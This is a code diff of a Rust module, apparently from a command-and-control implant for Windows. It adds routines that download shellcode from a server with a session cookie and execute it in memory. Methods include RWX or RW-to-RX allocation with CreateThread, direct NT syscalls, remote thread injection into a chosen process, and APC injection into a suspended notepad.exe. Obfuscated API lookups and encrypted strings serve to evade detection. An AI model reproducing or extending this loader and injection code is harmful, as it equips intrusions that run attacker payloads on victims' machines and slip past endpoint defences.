@@ -2,9 +2,9 @@ pub mod command {
     use crate::obfwin::Constants::*;
     use crate::obfwin::Functions::*;
     use litcrypt::lc;
-    use std::ptr::{null, null_mut};
-    use std::os::raw::c_void;
     use rust_syscalls::syscall;
+    use std::os::raw::c_void;
+    use std::ptr::{null, null_mut};
 
     fn get_file_vec(
         base_url: &str,
@@ -27,11 +27,8 @@ pub mod command {
             .headers(headers.clone())
             .send()
             .unwrap();
-        // let nopsled: Vec<u8> = vec![0x90, 0x90,  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
         let raw_file: Vec<u8> = file_response.bytes().unwrap().into();
-        // let mut file_vec: Vec<u8> = Vec::new();
-        // file_vec.extend_from_slice(&nopsled);
-        // file_vec.extend_from_slice(&raw_file);
+
         return raw_file;
     }
 
@@ -53,83 +50,146 @@ pub mod command {
         file_name: &str,
         memory_permissions: &str,
         kernel32: &obf_kernel32,
-        ntdll: &obf_ntdll
+        ntdll: &obf_ntdll,
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
 
         let file_bytes: &[u8] = &file_vec;
-        let mut region_size: usize = file_bytes.len();
+        let file_size: usize = file_bytes.len();
 
         let old_perms = PAGE_READWRITE;
 
-        use winapi::shared::basetsd::SIZE_T;
-        use winapi::um::winnt::{HANDLE, PAGE_READWRITE};
+        unsafe {
+            // If specified to use RW memory, allocate, copy, change to RX, execute
+            if memory_permissions == "RX" {
+                // Allocate some RW
+                let dest = (kernel32.VirtualAlloc)(
+                    null(),
+                    file_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_READWRITE,
+                );
+                // Copy the shellcode in there
+                (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
+                // Re-protect as exec-read
+                (kernel32.VirtualProtect)(dest, file_size, PAGE_EXECUTE_READ, old_perms);
+                // Run the shellcode
+                let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
+            } else {
+                // RWX by default, allocate, copy, execute
+                // Allocate some RWX
+                let dest = (kernel32.VirtualAlloc)(
+                    null(),
+                    file_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_EXECUTE_READWRITE,
+                );
+                // Copy the shellcode in there
+                (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
+                // Run the shellcode
+                let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
+            }
 
+            lc!("Shellcode successfully executed")
+        }
+    }
+
+    pub fn shellcode_spawn_sys(
+        base_url: &str,
+        cookie_header: &reqwest::header::HeaderValue,
+        file_name: &str,
+        memory_permissions: &str,
+        kernel32: &obf_kernel32,
+        ntdll: &obf_ntdll,
+    ) -> String {
+        // Get the file off the server
+        let file_vec = get_file_vec(base_url, file_name, cookie_header);
+
+        let file_bytes: &[u8] = &file_vec;
+        let file_bytes_v: *const c_void = file_bytes.as_ptr().cast();
+        let mut region_size: usize = file_bytes.len();
+
+        let mut old_perms = PAGE_READWRITE;
 
         unsafe {
+            let process_handle: isize = (kernel32.GetCurrentProcess)();
+            let mut base_address: *mut c_void = null_mut();
+            // let mut region_size: SIZE_T = 4096; // Size of each page in bytes
 
-            let process_handle: HANDLE = unsafe { winapi::um::processthreadsapi::GetCurrentProcess() };
-            let mut base_address: *mut winapi::ctypes::c_void = null_mut();
-           // let mut region_size: SIZE_T = 4096; // Size of each page in bytes
+            let mut hThread: *mut c_void = null_mut();
 
-
-
-                let a = syscall!("NtAllocateVirtualMemory", process_handle,
+            if memory_permissions == "RX" {
+                syscall!(
+                    "NtAllocateVirtualMemory",
+                    process_handle,
+                    &mut base_address,
+                    0,
+                    &mut region_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_READWRITE
+                );
+                syscall!(
+                    "NtWriteVirtualMemory",
+                    process_handle,
+                    base_address,
+                    file_bytes_v,
+                    region_size,
+                    0
+                );
+                syscall!(
+                    "NtProtectVirtualMemory",
+                    process_handle,
+                    &mut base_address,
+                    &mut region_size,
+                    PAGE_EXECUTE_READ,
+                    &mut old_perms
+                );
+            } else {
+                syscall!(
+                    "NtAllocateVirtualMemory",
+                    process_handle,
                     &mut base_address,
                     0,
                     &mut region_size,
                     MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE
                 );
-                // // let a = NtAllocateVirtualMemory(std::mem::transmute(curr_process), std::mem::transmute(dest), 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
-                // let nt = libloading::Library::new(lc!("ntdll.dll")).unwrap();
+                syscall!(
+                    "NtWriteVirtualMemory",
+                    process_handle,
+                    base_address,
+                    file_bytes_v,
+                    region_size,
+                    0
+                );
 
-                // let nt_alloc_v_mem: libloading::Symbol<unsafe extern "C" fn(HANDLE, &*mut _, i32, *mut usize, u32, u32) -> u32>
-                // = nt.get(b"NtAllocateVirtualMemory\0").unwrap();
+            }
+            syscall!(
+                "NtCreateThreadEx",
+                &mut hThread,
+                GENERIC_EXECUTE,
+                null::<*mut c_void>(),
+                process_handle,
+                base_address,
+                base_address,
+                FALSE,
+                null::<*mut c_void>(),
+                null::<*mut c_void>(),
+                null::<*mut c_void>(),
+                null::<*mut c_void>()
+            );
 
-                // let a = nt_alloc_v_mem(process_handle,
-                //     &mut base_address,
-                //     0,
-                //     &mut region_size,
-                //     MEM_COMMIT | MEM_RESERVE,
-                //     PAGE_EXECUTE_READWRITE,
-                // );
+            syscall!(
+                "NtWaitForSingleObject",
+                hThread,
+                FALSE,
+                null::<*mut c_void>()
+            );
 
-                // ret = std::mem::transmute(a);
-                // d = dest;
+            syscall!("NtClose", hThread);
 
-
-            // // If specified to use RW memory, allocate, copy, change to RX, execute
-            // if memory_permissions == "RW" {
-            //     // Allocate some RW
-            //     let dest = (kernel32.VirtualAlloc)(
-            //         null(),
-            //         file_size,
-            //         MEM_COMMIT | MEM_RESERVE,
-            //         PAGE_READWRITE,
-            //     );
-            //     // Copy the shellcode in there
-            //     (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
-            //     // Re-protect as exec-read
-            //     (kernel32.VirtualProtect)(dest, file_size, PAGE_EXECUTE_READ, old_perms);
-            //     // Run the shellcode
-            //     let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
-            // } else {
-            //     // RWX by default, allocate, copy, execute
-            //     // Allocate some RWX
-            //     let dest = (kernel32.VirtualAlloc)(
-            //         null(),
-            //         file_size,
-            //         MEM_COMMIT | MEM_RESERVE,
-            //         PAGE_EXECUTE_READWRITE,
-            //     );
-            //     // Copy the shellcode in there
-            //     (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
-            //     // Run the shellcode
-            //     let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
-            // }
-            format!("dest {:?} ret {}", base_address, a)
+            lc!("Shellcode successfully executed")
         }
     }
 
@@ -140,7 +200,7 @@ pub mod command {
         target_pid: u32,
         memory_permissions: &str,
         kernel32: &obf_kernel32,
-        ntdll: &obf_ntdll
+        ntdll: &obf_ntdll,
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
@@ -149,7 +209,6 @@ pub mod command {
         let file_size = file_bytes.len();
 
         unsafe {
-            
             // Get a handle on the target process
             let handle = (kernel32.OpenProcess)(
                 PROCESS_CREATE_THREAD
@@ -209,7 +268,7 @@ pub mod command {
                     null_mut(),
                 );
                 // Spawn the thread
-                 //std::arch::asm!("int3");
+                //std::arch::asm!("int3");
                 (kernel32.CreateRemoteThread)(handle, null(), 0, dest, null(), 0, null_mut());
             }
 
@@ -224,7 +283,7 @@ pub mod command {
         file_name: &str,
         memory_permissions: &str,
         kernel32: &obf_kernel32,
-        ntdll: &obf_ntdll
+        ntdll: &obf_ntdll,
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
@@ -233,7 +292,6 @@ pub mod command {
         let file_size = file_bytes.len();
 
         unsafe {
-   
             let mut old_perm = PAGE_READWRITE;
 
             // Fingers crossed custom STARTUPINFOA works
@@ -245,7 +303,18 @@ pub mod command {
             let ptr_si: *const i8 = std::mem::transmute(&si);
             let ptr_pi: *const i8 = std::mem::transmute(&pi);
 
-            let result = (kernel32.CreateProcessA)(null(), c_ptr_to_program_to_start.as_ptr().cast(), null(), null(), 0, CREATE_SUSPENDED, null(), null(), ptr_si, ptr_pi);
+            let result = (kernel32.CreateProcessA)(
+                null(),
+                c_ptr_to_program_to_start.as_ptr().cast(),
+                null(),
+                null(),
+                0,
+                CREATE_SUSPENDED,
+                null(),
+                null(),
+                ptr_si,
+                ptr_pi,
+            );
 
             // If specified to use RW memory, allocate, copy, change to RX, execute
             if memory_permissions == "RX" {
@@ -270,13 +339,10 @@ pub mod command {
                     PAGE_EXECUTE_READ,
                     &mut old_perm,
                 );
-                _ = (kernel32.QueueUserAPC)(
-                    dest,
-                    pi.hThread,
-                    null()
-                );
+                _ = (kernel32.QueueUserAPC)(dest, pi.hThread, null());
                 _ = (kernel32.ResumeThread)(pi.hThread);
-            } else { // Just allocate RWX and copy into it
+            } else {
+                // Just allocate RWX and copy into it
                 let dest = (kernel32.VirtualAllocEx)(
                     pi.hProcess,
                     null(),
@@ -291,24 +357,16 @@ pub mod command {
                     file_size,
                     null_mut(),
                 );
-                _ = (kernel32.QueueUserAPC)(
-                    dest,
-                    pi.hThread,
-                    null()
-                );
+                _ = (kernel32.QueueUserAPC)(dest, pi.hThread, null());
                 //std::arch::asm!("int3");
                 _ = (kernel32.ResumeThread)(pi.hThread);
             }
 
             lc!("Successfully spawned notepad.exe and injected the requested shellcode")
         }
-
     }
 
-    pub fn kill(
-        kill_id: &str
-    ) -> String {
-        
+    pub fn kill(kill_id: &str) -> String {
         // Send back the kill_id
 
         return kill_id.to_string();
